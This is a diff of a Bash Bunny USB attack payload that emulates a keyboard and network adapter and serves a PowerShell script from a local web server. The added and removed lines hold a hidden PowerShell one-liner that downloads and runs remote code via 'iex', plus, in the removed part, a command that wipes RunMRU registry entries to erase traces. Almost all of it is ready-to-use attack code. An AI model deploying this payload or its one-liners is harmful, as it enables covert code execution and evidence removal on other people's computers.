@@ -2,67 +2,57 @@
 #
 # Title:         Powershell Download and Execute
 # Author:        LowValueTarget
-# Version:       1.1
+# Version:       1.2
 # Category:      Powershell
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, RNDIS_ETHERNET
-# Firmware:      >= 1.1
-# 
-# OPTIMIZED FOR BASHBUNNY 1.1_x+
+# Firmware:      >= 1.2
 #
 # Quick HID attack to retrieve and run powershell payload from BashBunny web server - ensure psh.txt exists in payload directory
 # 
 # | Attack Stage        | Description                              |
 # | ------------------- | ---------------------------------------- |
 # | Stage 1             | Running Initial Powershell Commands      |
-# | Stage 2             | Turning up web server and DHCP           |
 # | Stage 3             | Delivering powershell payload            |
 #
 
+ATTACKMODE RNDIS_ETHERNET HID
 LED SETUP
+
+GET HOST_IP
+GET SWITCH_POSITION
 
 # Set working dir
 PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
-cd $PAYLOAD_DIR
-SERVER_LOG=server.log
+SERVER_LOG=$PAYLOAD_DIR/server.log
 
 # Fresh Server Log
 rm -f $SERVER_LOG
-# Disable ICMP/echo replies so our powershell stager doesn't attempt to access the SMB share before smbserver starts (workaround since Test-NetConnection 172.16.64.1 SMB only works on powershell 4.0+ for Windows 8+)
-echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+# Check for gohttp
+REQUIRETOOL gohttp
+
+# Start web server
+iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
+/tools/gohttp/gohttp -p 80 -d $PAYLOAD_DIR  > $SERVER_LOG 2>&1 &
 
 # Check for psh.txt
 if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
-    LED FAIL
+    LED FAIL2
     exit 1
 fi
 
 # Attack HID
-ATTACKMODE HID
 LED STAGE1
 
-# Attack
-RUN WIN "powershell -WindowStyle Hidden \"while (\$TRUE) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); (New-Object Net.WebClient).DownloadString('http://172.16.64.1/COMPLETE'); exit } }\""
-
-# Wipe prints
-RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""
+# Attack (abbreviations to allow run execution)
+RUN WIN "powershell -WindowStyle Hidden \"\$web=New-Object Net.WebClient;while (\$TRUE) {If ((New-Object net.sockets.tcpclient ('$HOST_IP','80')).Connected) {iex \$web.DownloadString('http://$HOST_IP/psh.txt');\$web.DownloadString('http://172.16.64.1/DONE');exit}}\""
+# Remove tracks in the psh payload if you wish
 
 # Attack Ethernet
 LED STAGE2
-ATTACKMODE RNDIS_ETHERNET
 
-# Start web server
-iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
-python -m SimpleHTTPServer 80 > $SERVER_LOG 2>&1 &
-
-# wait until python web server is listening
-while ! nc -z localhost 80; do sleep 0.2; done
-
-# Re-enable ICMP/echo replies to trip the powershell stager
-echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
-LED STAGE3
-
-while ! grep -Fq "GET /COMPLETE" $SERVER_LOG; do
+while ! grep -Fq "GET \"/DONE\"" $SERVER_LOG; do
     sleep .5
 done
 
